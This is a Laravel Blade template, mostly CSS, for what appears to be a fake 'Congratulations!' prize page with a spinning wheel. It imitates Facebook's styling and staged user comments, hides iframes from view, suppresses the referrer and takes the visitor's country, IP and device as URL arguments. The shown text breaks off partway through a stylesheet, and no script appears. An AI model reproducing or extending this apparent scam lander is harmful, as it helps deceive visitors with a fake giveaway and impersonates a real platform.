@extends('layouts.invite')

@section('before_styles')

@endsection

@section('content')
    <!DOCTYPE html>
<html>
<head>
    <base href="">
    <style type="text/css">.swal-icon--error {
            border-color: #f27474;
            -webkit-animation: animateErrorIcon .5s;
            animation: animateErrorIcon .5s
        }

        .swal-icon--error__x-mark {
            position: relative;
            display: block;
            -webkit-animation: animateXMark .5s;
            animation: animateXMark .5s
        }

        .swal-icon--error__line {
            position: absolute;
            height: 5px;
            width: 47px;
            background-color: #f27474;
            display: block;
            top: 37px;
            border-radius: 2px
        }

        .swal-icon--error__line--left {
            -webkit-transform: rotate(45deg);
            transform: rotate(45deg);
            left: 17px
        }

        .swal-icon--error__line--right {
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg);
            right: 16px
        }

        @-webkit-keyframes animateErrorIcon {
            0% {
                -webkit-transform: rotateX(100deg);
                transform: rotateX(100deg);
                opacity: 0
            }
            to {
                -webkit-transform: rotateX(0deg);
                transform: rotateX(0deg);
                opacity: 1
            }
        }

        @keyframes animateErrorIcon {
            0% {
                -webkit-transform: rotateX(100deg);
                transform: rotateX(100deg);
                opacity: 0
            }
            to {
                -webkit-transform: rotateX(0deg);
                transform: rotateX(0deg);
                opacity: 1
            }
        }

        @-webkit-keyframes animateXMark {
            0% {
                -webkit-transform: scale(.4);
                transform: scale(.4);
                margin-top: 26px;
                opacity: 0
            }
            50% {
                -webkit-transform: scale(.4);
                transform: scale(.4);
                margin-top: 26px;
                opacity: 0
            }
            80% {
                -webkit-transform: scale(1.15);
                transform: scale(1.15);
                margin-top: -6px
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1);
                margin-top: 0;
                opacity: 1
            }
        }

        @keyframes animateXMark {
            0% {
                -webkit-transform: scale(.4);
                transform: scale(.4);
                margin-top: 26px;
                opacity: 0
            }
            50% {
                -webkit-transform: scale(.4);
                transform: scale(.4);
                margin-top: 26px;
                opacity: 0
            }
            80% {
                -webkit-transform: scale(1.15);
                transform: scale(1.15);
                margin-top: -6px
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1);
                margin-top: 0;
                opacity: 1
            }
        }

        .swal-icon--warning {
            border-color: #f8bb86;
            -webkit-animation: pulseWarning .75s infinite alternate;
            animation: pulseWarning .75s infinite alternate
        }

        .swal-icon--warning__body {
            width: 5px;
            height: 47px;
            top: 10px;
            border-radius: 2px;
            margin-left: -2px
        }

        .swal-icon--warning__body, .swal-icon--warning__dot {
            position: absolute;
            left: 50%;
            background-color: #f8bb86
        }

        .swal-icon--warning__dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            margin-left: -4px;
            bottom: -11px
        }

        @-webkit-keyframes pulseWarning {
            0% {
                border-color: #f8d486
            }
            to {
                border-color: #f8bb86
            }
        }

        @keyframes pulseWarning {
            0% {
                border-color: #f8d486
            }
            to {
                border-color: #f8bb86
            }
        }

        .swal-icon--success {
            border-color: #a5dc86
        }

        .swal-icon--success:after, .swal-icon--success:before {
            content: "";
            border-radius: 50%;
            position: absolute;
            width: 60px;
            height: 120px;
            background: #fff;
            -webkit-transform: rotate(45deg);
            transform: rotate(45deg)
        }

        .swal-icon--success:before {
            border-radius: 120px 0 0 120px;
            top: -7px;
            left: -33px;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg);
            -webkit-transform-origin: 60px 60px;
            transform-origin: 60px 60px
        }

        .swal-icon--success:after {
            border-radius: 0 120px 120px 0;
            top: -11px;
            left: 30px;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg);
            -webkit-transform-origin: 0 60px;
            transform-origin: 0 60px;
            -webkit-animation: rotatePlaceholder 4.25s ease-in;
            animation: rotatePlaceholder 4.25s ease-in
        }

        .swal-icon--success__ring {
            width: 80px;
            height: 80px;
            border: 4px solid hsla(98, 55%, 69%, .2);
            border-radius: 50%;
            box-sizing: content-box;
            position: absolute;
            left: -4px;
            top: -4px;
            z-index: 2
        }

        .swal-icon--success__hide-corners {
            width: 5px;
            height: 90px;
            background-color: #fff;
            padding: 1px;
            position: absolute;
            left: 28px;
            top: 8px;
            z-index: 1;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg)
        }

        .swal-icon--success__line {
            height: 5px;
            background-color: #a5dc86;
            display: block;
            border-radius: 2px;
            position: absolute;
            z-index: 2
        }

        .swal-icon--success__line--tip {
            width: 25px;
            left: 14px;
            top: 46px;
            -webkit-transform: rotate(45deg);
            transform: rotate(45deg);
            -webkit-animation: animateSuccessTip .75s;
            animation: animateSuccessTip .75s
        }

        .swal-icon--success__line--long {
            width: 47px;
            right: 8px;
            top: 38px;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg);
            -webkit-animation: animateSuccessLong .75s;
            animation: animateSuccessLong .75s
        }

        @-webkit-keyframes rotatePlaceholder {
            0% {
                -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg)
            }
            5% {
                -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg)
            }
            12% {
                -webkit-transform: rotate(-405deg);
                transform: rotate(-405deg)
            }
            to {
                -webkit-transform: rotate(-405deg);
                transform: rotate(-405deg)
            }
        }

        @keyframes rotatePlaceholder {
            0% {
                -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg)
            }
            5% {
                -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg)
            }
            12% {
                -webkit-transform: rotate(-405deg);
                transform: rotate(-405deg)
            }
            to {
                -webkit-transform: rotate(-405deg);
                transform: rotate(-405deg)
            }
        }

        @-webkit-keyframes animateSuccessTip {
            0% {
                width: 0;
                left: 1px;
                top: 19px
            }
            54% {
                width: 0;
                left: 1px;
                top: 19px
            }
            70% {
                width: 50px;
                left: -8px;
                top: 37px
            }
            84% {
                width: 17px;
                left: 21px;
                top: 48px
            }
            to {
                width: 25px;
                left: 14px;
                top: 45px
            }
        }

        @keyframes animateSuccessTip {
            0% {
                width: 0;
                left: 1px;
                top: 19px
            }
            54% {
                width: 0;
                left: 1px;
                top: 19px
            }
            70% {
                width: 50px;
                left: -8px;
                top: 37px
            }
            84% {
                width: 17px;
                left: 21px;
                top: 48px
            }
            to {
                width: 25px;
                left: 14px;
                top: 45px
            }
        }

        @-webkit-keyframes animateSuccessLong {
            0% {
                width: 0;
                right: 46px;
                top: 54px
            }
            65% {
                width: 0;
                right: 46px;
                top: 54px
            }
            84% {
                width: 55px;
                right: 0;
                top: 35px
            }
            to {
                width: 47px;
                right: 8px;
                top: 38px
            }
        }

        @keyframes animateSuccessLong {
            0% {
                width: 0;
                right: 46px;
                top: 54px
            }
            65% {
                width: 0;
                right: 46px;
                top: 54px
            }
            84% {
                width: 55px;
                right: 0;
                top: 35px
            }
            to {
                width: 47px;
                right: 8px;
                top: 38px
            }
        }

        .swal-icon--info {
            border-color: #c9dae1
        }

        .swal-icon--info:before {
            width: 5px;
            height: 29px;
            bottom: 17px;
            border-radius: 2px;
            margin-left: -2px
        }

        .swal-icon--info:after, .swal-icon--info:before {
            content: "";
            position: absolute;
            left: 50%;
            background-color: #c9dae1
        }

        .swal-icon--info:after {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            margin-left: -3px;
            top: 19px
        }

        .swal-icon {
            width: 80px;
            height: 80px;
            border-width: 4px;
            border-style: solid;
            border-radius: 50%;
            padding: 0;
            position: relative;
            box-sizing: content-box;
            margin: 20px auto
        }

        .swal-icon:first-child {
            margin-top: 32px
        }

        .swal-icon--custom {
            width: auto;
            height: auto;
            max-width: 100%;
            border: none;
            border-radius: 0
        }

        .swal-icon img {
            max-width: 100%;
            max-height: 100%
        }

        .swal-title {
            color: rgba(0, 0, 0, .65);
            font-weight: 600;
            text-transform: none;
            position: relative;
            display: block;
            padding: 13px 16px;
            font-size: 27px;
            line-height: normal;
            text-align: center;
            margin-bottom: 0
        }

        .swal-title:first-child {
            margin-top: 26px
        }

        .swal-title:not(:first-child) {
            padding-bottom: 0
        }

        .swal-title:not(:last-child) {
            margin-bottom: 13px
        }

        .swal-text {
            font-size: 16px;
            position: relative;
            float: none;
            line-height: normal;
            vertical-align: top;
            text-align: left;
            display: inline-block;
            margin: 0;
            padding: 0 10px;
            font-weight: 400;
            color: rgba(0, 0, 0, .64);
            max-width: calc(100% - 20px);
            overflow-wrap: break-word;
            box-sizing: border-box
        }

        .swal-text:first-child {
            margin-top: 45px
        }

        .swal-text:last-child {
            margin-bottom: 45px
        }

        .swal-footer {
            text-align: right;
            padding-top: 13px;
            margin-top: 13px;
            padding: 13px 16px;
            border-radius: inherit;
            border-top-left-radius: 0;
            border-top-right-radius: 0
        }

        .swal-button-container {
            margin: 5px;
            display: inline-block;
            position: relative
        }

        .swal-button {
            background-color: #7cd1f9;
            color: #fff;
            border: none;
            box-shadow: none;
            border-radius: 5px;
            font-weight: 600;
            font-size: 14px;
            padding: 10px 24px;
            margin: 0;
            cursor: pointer
        }

        .swal-button:not([disabled]):hover {
            background-color: #78cbf2
        }

        .swal-button:active {
            background-color: #70bce0
        }

        .swal-button:focus {
            outline: none;
            box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(43, 114, 165, .29)
        }

        .swal-button[disabled] {
            opacity: .5;
            cursor: default
        }

        .swal-button::-moz-focus-inner {
            border: 0
        }

        .swal-button--cancel {
            color: #555;
            background-color: #efefef
        }

        .swal-button--cancel:not([disabled]):hover {
            background-color: #e8e8e8
        }

        .swal-button--cancel:active {
            background-color: #d7d7d7
        }

        .swal-button--cancel:focus {
            box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(116, 136, 150, .29)
        }

        .swal-button--danger {
            background-color: #e64942
        }

        .swal-button--danger:not([disabled]):hover {
            background-color: #df4740
        }

        .swal-button--danger:active {
            background-color: #cf423b
        }

        .swal-button--danger:focus {
            box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(165, 43, 43, .29)
        }

        .swal-content {
            padding: 0 20px;
            margin-top: 20px;
            font-size: medium
        }

        .swal-content:last-child {
            margin-bottom: 20px
        }

        .swal-content__input, .swal-content__textarea {
            -webkit-appearance: none;
            background-color: #fff;
            border: none;
            font-size: 14px;
            display: block;
            box-sizing: border-box;
            width: 100%;
            border: 1px solid rgba(0, 0, 0, .14);
            padding: 10px 13px;
            border-radius: 2px;
            transition: border-color .2s
        }

        .swal-content__input:focus, .swal-content__textarea:focus {
            outline: none;
            border-color: #6db8ff
        }

        .swal-content__textarea {
            resize: vertical
        }

        .swal-button--loading {
            color: transparent
        }

        .swal-button--loading ~ .swal-button__loader {
            opacity: 1
        }

        .swal-button__loader {
            position: absolute;
            height: auto;
            width: 43px;
            z-index: 2;
            left: 50%;
            top: 50%;
            -webkit-transform: translateX(-50%) translateY(-50%);
            transform: translateX(-50%) translateY(-50%);
            text-align: center;
            pointer-events: none;
            opacity: 0
        }

        .swal-button__loader div {
            display: inline-block;
            float: none;
            vertical-align: baseline;
            width: 9px;
            height: 9px;
            padding: 0;
            border: none;
            margin: 2px;
            opacity: .4;
            border-radius: 7px;
            background-color: hsla(0, 0%, 100%, .9);
            transition: background .2s;
            -webkit-animation: swal-loading-anim 1s infinite;
            animation: swal-loading-anim 1s infinite
        }

        .swal-button__loader div:nth-child(3n+2) {
            -webkit-animation-delay: .15s;
            animation-delay: .15s
        }

        .swal-button__loader div:nth-child(3n+3) {
            -webkit-animation-delay: .3s;
            animation-delay: .3s
        }

        @-webkit-keyframes swal-loading-anim {
            0% {
                opacity: .4
            }
            20% {
                opacity: .4
            }
            50% {
                opacity: 1
            }
            to {
                opacity: .4
            }
        }

        @keyframes swal-loading-anim {
            0% {
                opacity: .4
            }
            20% {
                opacity: .4
            }
            50% {
                opacity: 1
            }
            to {
                opacity: .4
            }
        }

        .swal-overlay {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            text-align: center;
            font-size: 0;
            overflow-y: auto;
            background-color: rgba(0, 0, 0, .4);
            z-index: 10000;
            pointer-events: none;
            opacity: 0;
            transition: opacity .3s
        }

        .swal-overlay:before {
            content: " ";
            display: inline-block;
            vertical-align: middle;
            height: 100%
        }

        .swal-overlay--show-modal {
            opacity: 1;
            pointer-events: auto
        }

        .swal-overlay--show-modal .swal-modal {
            opacity: 1;
            pointer-events: auto;
            box-sizing: border-box;
            -webkit-animation: showSweetAlert .3s;
            animation: showSweetAlert .3s;
            will-change: transform
        }

        .swal-modal {
            width: 478px;
            opacity: 0;
            pointer-events: none;
            background-color: #fff;
            text-align: center;
            border-radius: 5px;
            position: static;
            margin: 20px auto;
            display: inline-block;
            vertical-align: middle;
            -webkit-transform: scale(1);
            transform: scale(1);
            -webkit-transform-origin: 50% 50%;
            transform-origin: 50% 50%;
            z-index: 10001;
            transition: opacity .2s, -webkit-transform .3s;
            transition: transform .3s, opacity .2s;
            transition: transform .3s, opacity .2s, -webkit-transform .3s
        }

        @media (max-width: 500px) {
            .swal-modal {
                width: calc(100% - 20px)
            }
        }

        @-webkit-keyframes showSweetAlert {
            0% {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
            1% {
                -webkit-transform: scale(.5);
                transform: scale(.5)
            }
            45% {
                -webkit-transform: scale(1.05);
                transform: scale(1.05)
            }
            80% {
                -webkit-transform: scale(.95);
                transform: scale(.95)
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
        }

        @keyframes showSweetAlert {
            0% {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
            1% {
                -webkit-transform: scale(.5);
                transform: scale(.5)
            }
            45% {
                -webkit-transform: scale(1.05);
                transform: scale(1.05)
            }
            80% {
                -webkit-transform: scale(.95);
                transform: scale(.95)
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
        }</style>
    <meta name="referrer" content="never">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    <!-- Arguments:
   index.html?country={country}&browser={browser}&ip={ip}&brand={device_brand}&model={device_model}
    -->


    <style>
        iframe {
            visibility: hidden;
            position: absolute;
            left: 0;
            top: 0;
            height: 0;
            width: 0;
            border: 0
        }
    </style>

    <meta content="never" name="referrer">
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
    <title>Congratulations!</title>
    <style>
        * {
            margin: 0;
            overflow-x: hidden
        }

        body {
            background: #d3d6db;
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
            font-size: small
        }

        #header {
            background-color: #3b5998;
            color: #fff;
            height: 40px;
            max-height: 40px;
            width: 100%;
            overflow: hidden;
            text-align: center
        }

        #header h3 {
            display: inline-block;
            font-size: 1.1em;
            line-height: 40px;
            padding-left: 37px
        }

        .icon {
            background-size: contain;
            display: inline-block;
            width: 27px;
            height: 25px;
            float: right;
            margin-top: 7px;
            margin-right: 10px
        }

        #container {
            padding: 6px
        }

        #firstpage {
            background-color: #fff;
            border-radius: 3px;
            margin-bottom: 5px;
            padding: 5px 10px
        }

        #subheadline {
            font-weight: 400;
            text-align: center;
            line-height: 15px
        }

        .date {
            font-size: .85em;
            color: #9c9c9c;
            margin: 2px 0
        }

        #topDate {
            text-align: center;
            width: 100%
        }

        .intro {
            margin-bottom: 5px
        }

        #wheelCon {
            position: relative;
            background-size: contain;
            background-position: center;
            background-repeat: no-repeat;
            background-color: #fff;
            border-radius: 3px;
            overflow: hidden
        }

        .winbox {
            font-size: 14px;
            animation-name: x066
        }

        #wheel {
            z-index: 1;
            width: 100%;
            height: auto;
            margin-top: 5px
        }

        #pressButton {
            position: absolute;
            background-size: contain;
            cursor: pointer;
            width: 25%;
            height: 0;
            padding-top: 30.5%;
            z-index: 2;
            margin-left: auto;
            margin-right: auto;
            left: 0;
            right: 0;
            top: 110px
        }

        #devMockup {
            position: absolute;
            max-width: 40%;
            height: auto;
            z-index: 3;
            display: none
        }

        .fbcoms {
            font-family: Tahoma, Verdana, sans-serif;
            background-color: #fff;
            width: 100%;
            margin-bottom: 5px;
            padding: 2px;
            font-size: 12px;
            border-radius: 3px;
            text-align: left;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box
        }

        .com-bu {
            left: 75%;
            animation-name: x205b3bg8puq3yce1
        }

        .totlikes {
            padding: 5px 5px 5px 24px;
            background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAAQBAMAAAACH4lsAAAAJFBMVEX///87WZhPaqNac6hieq12i7d6jrmRosWfrsy2wdjEzeD///+4DpBBAAAAAXRSTlMAQObYZgAAAD5JREFUCJljYMAFhGAMlk0wFuNGGKsVzpLeKJgApBwFBXfv3i0AZIkX7oayRAPxswSjdu82AOtlmCoojN0VACVEF76WXuvhAAAAAElFTkSuQmCC");
            background-repeat: no-repeat;
            background-position: 5px center
        }

        .likescom {
            padding: 5px
        }

        .topcomments {
            margin: 5px
        }

        .fbblue {
            color: #3c5a96
        }

        .fbblue:hover {
            cursor: pointer;
            text-decoration: underline
        }

        .o {
            color: blue;
            position: absolute;
            top: 0;
            left: -5000px
        }

        .item {
            position: relative;
            padding: 5px 5px 5px 60px;
            min-height: 60px;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box
        }

        .button {
            -moz-box-shadow: inset 0 1px 0 0 #7a8eb9;
            -webkit-box-shadow: inset 0 1px 0 0 #7a8eb9;
            box-shadow: inset 0 1px 0 0 #7a8eb9;
            background: -webkit-gradient(linear, left top, left bottom, color-stop(.05, #637aad), color-stop(1, #5972a7));
            background: -moz-linear-gradient(top, #637aad 5%, #5972a7 100%);
            background: -webkit-linear-gradient(top, #637aad 5%, #5972a7 100%);
            background: -o-linear-gradient(top, #637aad 5%, #5972a7 100%);
            background: -ms-linear-gradient(top, #637aad 5%, #5972a7 100%);
            background: linear-gradient(to bottom, #637aad 5%, #5972a7 100%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#637aad', endColorstr='#5972a7', GradientType=0);
            background-color: #637aad;
            border: 1px solid #314179;
            color: #fff;
            font-size: 16px;
            font-weight: 700;
            height: 27px;
            line-height: 27px;
            text-decoration: none;
            width: 180px;
            display: block;
            margin-top: 4px;
            text-align: center
        }

        .smallfont {
            font-size: 12px;
            margin: 0;
            overflow-x: hidden
        }

        .item .profileimg {
            position: absolute;
            top: 10px;
            left: 5px;
            border-radius: 50%;
        }

        .comtxt {
            line-height: 16px;
            margin: 0;
            overflow-x: hidden
        }

        .name {
            color: #3c5a96;
            font-weight: 700
        }

        .ago {
            color: #86878c;
            font-size: .95em
        }

        .fblike {
            color: #3c5a96;
            font-size: .95em;
            cursor: pointer
        }

        .fblike:hover {
            text-decoration: underline
        }

        .combot {
            padding-top: 5px;
            margin: 0;
            overflow-x: hidden
        }

        .likes {
            color: #3c5a96;
            font-size: .95em;
            cursor: pointer;
            padding-bottom: 3px
        }

        .fbimg {
            background-color: #fff;
            border-radius: 2px;
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            max-width: 208px;
            width: 100%;
            padding: 3px;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            border: 1px solid grey;
            margin: 10px 0 5px
        }

        .btmComment {
            background-color: #fff;
            border-radius: 3px;
            text-align: center;
            padding: 10px
        }

        .

        =
        kTMygjN {
            margin: 30px 0 20px;
            text-align: center
        }

        .congrats {
            background-color: #fff;
            text-align: center;
            line-height: 1.5;
            border-radius: 3px;
            margin-bottom: 5px;
            padding: 8px
        }

        .congrats1 {
            background-color: #fff;
            text-align: left;
            line-height: 1.5;
            border-radius: 3px;
            margin-bottom: 5px;
            padding: 8px
        }

        .timer {
            background-color: #fff;
            line-height: 1.5;
            border-radius: 3px;
            margin-bottom: 5px;
            padding: 8px
        }

        .corner-ribbon {
            width: 400px;
            position: fixed;
            top: -30px;
            left: -170px;
            text-align: center; /*line-height: 50px;*/
            letter-spacing: 1px;
            color: #f0f0f0;
            font-family: Stencil Std, fantasy;
            z-index: 999999999999;
            transform: rotate(-45deg);
            -webkit-transform: rotate(-45deg);
            background: red;
            box-shadow: 0 0 10px rgba(0, 0, 0, .7);
        }

        .yo {
            box-shadow: 0 0 10px rgba(0, 0, 0, .7);
        }

        .prize {
            background-color: #fff;
            margin-bottom: 5px;
            border-radius: 3px
        }

        .pagetwo {
            display: none
        }

        .prizetab1 {
            text-align: right;
            align: center;
            margin: 30px;
            border: 1px solid;
            width: 100%;
            border-collapse: collapse;
        }

        .proof {
            no-repeat top left;
            width: 200px
        }

        .pixel {
            align: right
        }

        .spinAround {
            -webkit-animation: spin 6.6s;
            animation-timing-function: ease;
            animation-iteration-count: 1;
            animation-direction: normal;
            -webkit-animation-fill-mode: forwards;
            -moz-animation-fill-mode: forwards;
            -o-animation-fill-mode: forwards;
            -ms-animation-fill-mode: forwards;
            animation-fill-mode: forwards
        }

        @-webkit-keyframes spin {
            0% {
                -webkit-transform: rotate(0);
                -ms-transform: rotate(0);
                transform: rotate(0)
            }
            90% {
                -webkit-transform: rotate(3110deg);
                -ms-transform: rotate(3110deg);
                transform: rotate(3110deg)
            }
            95% {
                -webkit-transform: rotate(3108deg);
                -ms-transform: rotate(3108deg);
                transform: rotate(3108deg)
            }
            100% {
                -webkit-transform: rotate(3109deg);
                -ms-transform: rotate(3109deg);
                transform: rotate(3109deg)
            }
        }

        .spinAround2 {
            -webkit-animation: spin2 6.6s;
            animation-timing-function: ease;
            animation-iteration-count: 1;
            animation-direction: normal;
            -webkit-animation-fill-mode: forwards;
            -moz-animation-fill-mode: forwards;
            -o-animation-fill-mode: forwards;
            -ms-animation-fill-mode: forwards;
            animation-fill-mode: forwards
        }

        @-webkit-keyframes spin2 {
            0% {
                -webkit-transform: rotate(3109deg);
                -ms-transform: rotate(3109deg);
                transform: rotate(3109deg)
            }
            90% {
                -webkit-transform: rotate(6314deg);
                -ms-transform: rotate(6314deg);
                transform: rotate(6314deg)
            }
            95% {
                -webkit-transform: rotate(6312deg);
                -ms-transform: rotate(6312deg);
                transform: rotate(6312deg)
            }
            100% {
                -webkit-transform: rotate(6313deg);
                -ms-transform: rotate(6313deg);
                transform: rotate(6313deg)
            }
        }

        .animated {
            -webkit-animation-duration: 1s;
            animation-duration: 1s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both
        }

        @-webkit-keyframes rotateIn {
            0% {
                -webkit-transform-origin: center;
                transform-origin: center;
                -webkit-transform: rotate3d(0, 0, 1, -200deg);
                transform: rotate3d(0, 0, 1, -200deg);
                opacity: 0
            }
            100% {
                -webkit-transform-origin: center;
                transform-origin: center;
                -webkit-transform: none;
                transform: none;
                opacity: 1
            }
        }

        @keyframes rotateIn {
            0% {
                -webkit-transform-origin: center;
                transform-origin: center;
                -webkit-transform: rotate3d(0, 0, 1, -200deg);
                transform: rotate3d(0, 0, 1, -200deg);
                opacity: 0
            }
            100% {
                -webkit-transform-origin: center;
                transform-origin: center;
                -webkit-transform: none;
                transform: none;
                opacity: 1
            }
        }

        .rotateIn {
            -webkit-animation-name: rotateIn;
            animation-name: rotateIn
        }

        .transparent {
            opacity: .6;
            filter: alpha(opacity=60)
        }

        @media (min-width: 614px) {
            #wheel {
                width: 32vw;
                left: 47vw;
                top: 27vw
            }

            #pressButton {
                width: 6%;
                top: 38% !important;
                background-repeat: no-repeat
            }

            .bounce {
                display: inline-block;
                -webkit-animation: a .6s ease infinite;
                animation: a .6s ease infinite;
                color: #ffa400
            }
        }
    </style>
    <style title="icons">
        /*! icons.css http://www.fasthtml.net
        Convert images to base64: https://www.browserling.com/tools/image-to-base64
        Stylesheet format: .imageexample{background: url( "data:image/png;base64,***") 0 0; width: ***px; height: ***px;}
        (Substitute *** with base64 string, image width, and image height)
        Usage in html:
        <div class ="imageexample"></div>
        */
        .f8 {
            background: url("data:image/jpg;base64,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") 0 0;
            width: 50px;
            height: 50px;
        }

        .f2 {
